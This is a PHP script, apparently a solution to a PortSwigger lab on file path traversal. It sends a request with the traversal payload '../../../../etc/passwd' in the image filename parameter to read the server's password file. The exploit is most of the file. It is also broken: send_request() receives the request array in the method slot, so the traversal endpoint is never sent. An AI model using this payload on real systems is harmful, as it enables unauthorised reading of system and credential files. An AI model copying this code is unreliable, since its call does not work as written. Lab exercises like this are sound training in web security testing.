<?php

/* This lab contains a file path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the /etc/passwd file.

Lab link: https://portswigger.net/web-security/file-path-traversal/lab-simple
*/

use GuzzleHttp\Client;

require_once('../vendor/autoload.php');

/*
Generic function for sending web requests

@param GuzzleHttp $client  A GuzzleHttp instance bounded to a base uri
@param array $params  Associative array that contains options for the request (enpoint, headers, post data etc.).
                      default just points to the root endpoint of the site
@param string $method  The REST api request method. Defult is GET
@return 
*/
function send_request($client, $method = 'GET', $params = ['endpoint' => '/']) {
    $response = $client->request($method, $params['endpoint']);
    return $response;
}

$lab_id = '0a81001303a383cd80ce1c5900a3002d'; // Change based on lab id
$uri = 'https://' . $lab_id . '.web-security-academy.net';
$client = new Client([ 'base_uri' => $uri ]); // Establish connection to base lab page

$requestdata = [
    'endpoint' => '/image?filename=../../../../etc/passwd',  // Tamper filename var to get passwd file on server
];

$response = send_request($client, $requestdata);

echo $response->getBody(), PHP_EOL;
echo 'done', PHP_EOL;
?>